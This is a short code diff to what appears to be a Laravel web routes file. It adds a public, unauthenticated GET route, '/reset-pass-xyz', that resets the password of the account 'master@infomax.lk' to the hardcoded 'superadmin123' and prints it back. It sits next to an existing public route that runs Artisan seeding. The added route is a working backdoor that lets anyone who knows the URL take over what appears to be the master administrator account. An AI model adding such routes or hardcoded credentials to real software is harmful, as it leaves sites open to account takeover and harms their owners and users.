@@ -286,4 +286,10 @@ Route::get('/run-seed-xyz', function () {
     return '<pre>' . Artisan::output() . '</pre>';
 });
 
+Route::get('/reset-pass-xyz', function () {
+    $user = App\Models\User::where('email', 'master@infomax.lk')->first();
+    $user->password = bcrypt('superadmin123');
+    $user->save();
+    return 'Password reset to: superadmin123';
+});
 require __DIR__ . '/auth.php';
